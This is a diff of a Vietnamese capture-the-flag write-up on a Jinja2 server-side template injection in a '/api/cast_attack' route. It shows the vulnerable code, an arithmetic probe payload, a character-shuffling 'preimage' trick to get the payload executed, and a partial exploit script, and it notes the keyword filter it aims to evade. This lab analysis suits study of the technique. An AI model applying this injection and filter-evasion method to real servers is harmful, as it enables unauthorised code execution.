@@ -24,24 +24,29 @@ Phép thuật chưa bao giờ là con đường bằng phẳng. Chỉ khi kiên 
 
 ## Tổng quan
 
-Trong `/api/cast_attack`, khi `attack_name` không trùng key hợp lệ thì server sẽ hoạt động:
+Đọc qua source thì ta thấy ở route /api/cast_attack, khi attack_name không trùng key hợp lệ thì server sẽ xử lí như sau:
 
 ```python
-attack_name = valid_template(attack_name)
-if not special_filter(attack_name):
-    return jsonify({"error": "Creating magic is failed"}), 404
-template = render_template_string("<i>No magic name "+attack_name+" here, try again!</i>")
-return jsonify({"error": template}), 404
+@app.route("/api/cast_attack")
+def cast_attack():
+    ....
+            attack_name=valid_template(attack_name)
+            if not special_filter(attack_name):
+                return jsonify({"error": "Creating magic is failed"}), 404
+            template=render_template_string("<i>No magic name "+attack_name+ " here, try again!</i>")    
+            return jsonify({"error": template}), 404
+        except Exception as e:
+            return jsonify({"error": "There is something wrong here: "+str(e)}), 404
 ```
 
-- `attack_name` được nối chuỗi trực tiếp vào template và render bằng Jinja2 dẫn đến có thể SSTI.
-- `GET /api/cast_attack?attack_name={{70-21}}` trả về “No magic name `0{}-2}{71` here…”.
-    - Gửi thô `{{70-21}}` thì sẽ bị server xáo ký tự trước khi render lúc đó template nhận chuỗi đã bị đảo (`0{}-2}{71`), không thực thi payload được nên server trả về chính chuỗi bị đảo trong thông báo.
-- Nếu gửi **preimage** của biểu thức (ví dụ `{1}{0-}72` cho độ dài 8) thì server xáo xong mới khớp lại thành `{{70-21}}` lúc đó Jinja thực thi và mình sẽ thấy output là `49`.
+- `attack_name` được nối chuỗi trực tiếp vào template và render bằng Jinja2, ở đây có thể lợi dụng khai thác lỗ hổng SSTI.
+- Test thử bằng `GET /api/cast_attack?attack_name={{70-21}}` thì mình thấy server trả về “No magic name `0{}-2}{71` here…”.
+    - Khi gửi payload thô theo dạng gốc `{{70-21}}` thì payload sẽ bị server xáo ký tự trước khi render, lúc đó template nhận chuỗi đã bị đảo `0{}-2}{71`, nên server sẽ không thực thi payload được và trả về chính chuỗi bị đảo trong thông báo.
+- Nếu gửi **preimage** của biểu thức `{{70-21}}` là `{1}{0-}72` ( với độ dài 8) thì server xáo xong mới khớp lại thành `{{70-21}}` lúc đó Jinja thực thi và output là `49`.
 
 ## Khai thác
 
-Script để gửi **preimage** cho biểu thức SSTI:
+Để gửi preimage cho payload SSTI thì mình dùng script này, sau khi chuyển thành chuỗi preimage thì sẽ gửi lên server để server thực thi payload và trả về output:
 
 ```python
 import re, math, argparse, requests
@@ -111,7 +116,7 @@ if __name__ == "__main__":
         print(requests.get(API, params={"attack_name": s}).json().get("error",""))
 ```
 
-Đọc source code sẽ thấy với filter này thì mình bị chặn khá nhiều ở payload, mình bị chặn `import`, `os` lẫn `sys`  ở payload trực tiếp, những cái rất quan trọng để đọc flag, nên mình sẽ nghĩ cách để có thể luồn qua và gọi chúng, tất nhiên là sẽ phải dùng cách cộng chuỗi là đầu tiên: 
+Đọc source code sẽ thấy với filter này thì mình bị chặn những literal nhạy cảm, tất nhiên là mình cũng bị chặn import, os lẫn sys  ở payload đầu vào, những cái rất quan trọng để đọc được flag: 
 
 ```python
 def special_filter(user_input):
